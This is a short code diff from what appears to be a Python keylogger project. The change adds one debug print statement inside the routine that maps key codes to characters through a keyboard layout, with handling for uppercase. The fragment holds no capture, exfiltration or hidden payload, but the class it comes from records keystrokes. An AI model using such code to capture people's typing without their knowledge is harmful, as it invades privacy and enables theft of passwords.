@@ -62,6 +62,7 @@ class KeyLogger:
                 if data[0] == 2:
                     uppercase = True
                 try:
+                    print(self.keyboard_layout[str(key_code)])
                     offset: int = int((lambda u: u[0] if uppercase else u[1])(self.keyboard_layout[str(key_code)]))
                     if offset is None:
                         continue
